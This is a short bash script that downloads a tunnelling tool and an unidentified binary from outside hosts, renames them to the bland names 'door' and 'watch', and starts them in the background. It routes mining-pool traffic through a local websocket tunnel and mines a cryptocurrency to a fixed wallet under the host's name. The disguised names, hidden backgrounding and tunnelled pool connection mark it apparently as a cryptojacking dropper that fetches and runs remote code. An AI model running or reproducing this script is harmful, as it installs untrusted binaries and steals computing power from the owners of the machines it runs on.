#!/bin/bash
WS_PORT=$(shuf -i 10000-65000 -n 1)
TCP_PORT=$(shuf -i 10000-65000 -n 1)
curl -L -O -J https://storage.technoelectro.online/wstunnel_10.5.2_linux_amd64.tar.gz
tar -xf wstunnel_10.5.2_linux_amd64.tar.gz
curl  -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/forge
mv wstunnel door
mv forge watch
chmod +x door watch
nohup ./door server ws://127.0.0.1:${WS_PORT} &
nohup ./door client -L tcp://127.0.0.1:${TCP_PORT}:pearlski.jetskipool.ai:6970 ws://127.0.0.1:${WS_PORT} &

./watch --algorithm pearlhash --pool 127.0.0.1:${TCP_PORT} --wallet prl1p2jan4dvkdfkt5r3pra7z96axrxjyjcgat9w7ldetlcy9wffm569sc9ux2t --worker $(hostname)

